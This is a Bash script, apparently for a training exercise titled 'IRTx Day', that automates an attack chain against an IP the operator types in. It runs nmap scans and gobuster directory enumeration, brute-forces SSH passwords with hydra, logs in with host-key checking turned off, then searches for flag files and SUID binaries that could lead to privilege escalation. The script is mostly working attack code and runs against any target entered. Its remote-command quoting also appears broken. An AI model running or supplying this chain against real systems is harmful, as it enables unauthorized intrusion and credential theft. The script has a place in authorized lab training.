#!/usr/bin/env bash
# ============================================================
#  IRTx Day — Guided Attack Chain Script
#  Target network: LANDMZ  10.30.0.0/24
# ============================================================

set -u

# ── Colours ────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

# ── Globals (populated as script progresses) ───────────────
TARGET_IP=""
HTTP_PORT=""
SSH_PORT=""
SSH_USER=""
SSH_PASS=""
OPEN_PORTS=""

# ── Helpers ────────────────────────────────────────────────
banner() {
  local text="$1" char="${2:-=}"
  local line; line="$(printf '%0.s'"$char" {1..60})"
  echo -e "\n${BOLD}${CYAN}${line}\n  ${text}\n${line}${RESET}\n"
}

info()  { echo -e "${GREEN}[*]${RESET} $*"; }
warn()  { echo -e "${YELLOW}[!]${RESET} $*"; }
err()   { echo -e "${RED}[!]${RESET} $*" >&2; }
step()  { echo -e "\n${BOLD}${YELLOW}>>> STEP $1: $2${RESET}\n"; }
pause() { echo -e "\n${CYAN}Press [Enter] to continue...${RESET}"; read -r; }

# ── Step 1 — System Update ─────────────────────────────────
step1_update() {
  step 1 "System Update"
  info "Running: sudo apt update"
  sudo apt update
  info "System update complete."
  pause
}

# ── Step 2 — Install Tools ─────────────────────────────────
step2_install() {
  step 2 "Install Required Tools"
  info "Installing: gobuster hydra wordlists seclists"
  sudo apt install -y gobuster hydra wordlists seclists
  info "All tools installed."
  pause
}

# ── Step 3 — Initial nmap Scan ─────────────────────────────
step3_nmap_top() {
  step 3 "nmap — Top 1024 Ports"

  read -rp "  Enter target IP address: " TARGET_IP
  [[ -z "$TARGET_IP" ]] && { err "No IP entered. Exiting."; exit 1; }

  info "Running: sudo nmap --top-ports 1024 ${TARGET_IP}"
  echo ""

  NMAP_OUT="$(sudo nmap --top-ports 1024 "$TARGET_IP")"
  echo "$NMAP_OUT"

  # Store open ports for next step
  OPEN_PORTS="$(echo "$NMAP_OUT" \
    | grep '/open' \
    | awk -F'/' '{print $1}' \
    | tr '\n' ',' \
    | sed 's/,$//' || true)"

  info "Open ports detected: ${OPEN_PORTS}"
  pause
}

# ── Step 4 — Service Version Scan ─────────────────────────
step4_nmap_sv() {
  step 4 "nmap — Service Version Scan"

  echo ""
  info "Open ports from previous scan: ${OPEN_PORTS}"
  read -rp "  Enter port(s) to version-scan (e.g. 22,80,8080): " PORT_LIST
  [[ -z "$PORT_LIST" ]] && PORT_LIST="$OPEN_PORTS"

  info "Running: sudo nmap -sV -p ${PORT_LIST} ${TARGET_IP}"
  echo ""

  SV_OUT="$(sudo nmap -sV -p "$PORT_LIST" "$TARGET_IP")"
  echo "$SV_OUT"

  # Auto-detect HTTP and SSH ports for later steps
  HTTP_PORT="$(echo "$SV_OUT" \
    | grep -iE 'http|web' \
    | grep '/open' \
    | awk -F'/' 'NR==1{print $1}' 2>/dev/null || true)"

  SSH_PORT="$(echo "$SV_OUT" \
    | grep -i 'ssh' \
    | grep '/open' \
    | awk -F'/' 'NR==1{print $1}' 2>/dev/null || true)"

  [[ -n "$HTTP_PORT" ]] && info "HTTP port detected: ${HTTP_PORT}"
  [[ -n "$SSH_PORT"  ]] && info "SSH port detected:  ${SSH_PORT}"

  pause
}

# ── Step 5 — curl HTTP Discovery ──────────────────────────
step5_curl_discovery() {
  step 5 "curl — HTTP Discovery"

  if [[ -z "$HTTP_PORT" ]]; then
    read -rp "  Enter HTTP port number: " HTTP_PORT
  fi

  local url="http://${TARGET_IP}:${HTTP_PORT}"
  info "Running: curl -v ${url}"
  echo ""

  curl -v --max-time 10 "$url" 2>&1 || true

  echo ""
  info "curl response displayed above."
  pause
}

# ── Step 6 — gobuster Directory Enumeration ───────────────
step6_gobuster() {
  step 6 "gobuster — Directory Enumeration"

  local url="http://${TARGET_IP}:${HTTP_PORT}"
  local wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"

  if [[ ! -f "$wordlist" ]]; then
    warn "Wordlist not found at $wordlist"
    read -rp "  Enter wordlist path: " wordlist
  fi

  info "Running: gobuster dir -u ${url} -w ${wordlist} -t 5"
  echo ""

  gobuster dir \
    -u "$url" \
    -w "$wordlist" \
    -t 5 \
    --no-error 2>/dev/null || true

  pause
}

# ── Step 7 — curl filename.txt ──────────────────────────────
step7_curl_robots() {
  step 7 "curl — filename.txt"

  echo "Enter the .txt file to request:"
  read -r txtfile

  local url="http://${TARGET_IP}:${HTTP_PORT}/${txtfile}"

  info "Running: curl ${url}"
  echo ""

  curl --max-time 10 "$url" 2>&1 || true

  echo ""
  pause
}

# ── Step 8 — Hydra SSH Brute-Force ────────────────────────
step8_hydra() {
  step 8 "Hydra — SSH Password Attack"

  if [[ -z "$SSH_PORT" ]]; then
    read -rp "  Enter SSH port number: " SSH_PORT
  fi

  read -rp "  Enter SSH username to attack: " SSH_USER
  [[ -z "$SSH_USER" ]] && { err "No username entered."; return; }

  local wordlist="/usr/share/wordlists/fasttrack.txt"
  if [[ ! -f "$wordlist" ]]; then
    warn "Wordlist not found at $wordlist"
    read -rp "  Enter wordlist path: " wordlist
  fi

  info "Running: hydra -t 1 -f -l ${SSH_USER} -P ${wordlist} ssh://${TARGET_IP}:${SSH_PORT}"
  warn "This may take several minutes..."
  echo ""

  HYDRA_OUT="$(hydra \
    -t 1 \
    -f \
    -l "$SSH_USER" \
    -P "$wordlist" \
    "ssh://${TARGET_IP}:${SSH_PORT}" 2>&1 || true)"

  echo "$HYDRA_OUT"

  # Extract discovered password
  SSH_PASS="$(echo "$HYDRA_OUT" \
    | grep -i "login:" \
    | awk '{print $NF}' | head -1 || true)"

  if [[ -n "$SSH_PASS" ]]; then
    echo ""
    info "Password found: ${BOLD}${GREEN}${SSH_PASS}${RESET}"
  else
    warn "No password found in hydra output."
    read -rp "  Enter password manually to continue: " SSH_PASS
  fi

  pause
}

# ── Step 9 — SSH Connection ────────────────────────────────
step9_ssh_connect() {
  step 9 "SSH — Establish Session"

  info "Credentials: ${SSH_USER}@${TARGET_IP} -p ${SSH_PORT}"
  info "Password:    ${SSH_PASS}"
  echo ""
  warn "You will now be dropped into an interactive SSH session."
  warn "Steps 10 and 11 will run automatically inside the session."
  warn "Type 'exit' when done to return to this script."
  echo ""
  pause

  # Build remote command block: run flag hunt + SUID search then leave shell interactive
  local remote_cmds
  remote_cmds="$(cat <<'REMOTE'

echo ""
echo "================================================================"
echo "  STEP 10: find / -iname flag.txt 2>/dev/null"
echo "================================================================"
find / -iname flag.txt 2>/dev/null
echo ""
echo "================================================================"
echo "  STEP 11: find / -perm /4000 2>/dev/null  (SUID files)"
echo "================================================================"
find / -perm /4000 2>/dev/null
echo ""
echo "================================================================"
echo "  Automated steps complete. Explore further or type 'exit'."
echo "================================================================"
echo ""
REMOTE
)"

  ssh \
    -t \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p "$SSH_PORT" \
    "${SSH_USER}@${TARGET_IP}" \
    "bash --init-file <(echo '$remote_cmds')" \
    || true
}

# ── Step 12 — Quit ─────────────────────────────────────────
step12_quit() {
  banner "IRTx Day Complete" "*"
  info "Summary of targets used:"
  echo "  IP:        ${TARGET_IP}"
  echo "  HTTP port: ${HTTP_PORT}"
  echo "  SSH port:  ${SSH_PORT}"
  echo "  SSH user:  ${SSH_USER}"
  echo "  SSH pass:  ${SSH_PASS}"
  echo ""
  exit 0
}

# ── Main ───────────────────────────────────────────────────
banner "IRTx Day — Guided Attack Chain" "*"

step1_update
step2_install
step3_nmap_top
step4_nmap_sv
step5_curl_discovery
step6_gobuster
step7_curl_robots
step8_hydra
step9_ssh_connect
step12_quit
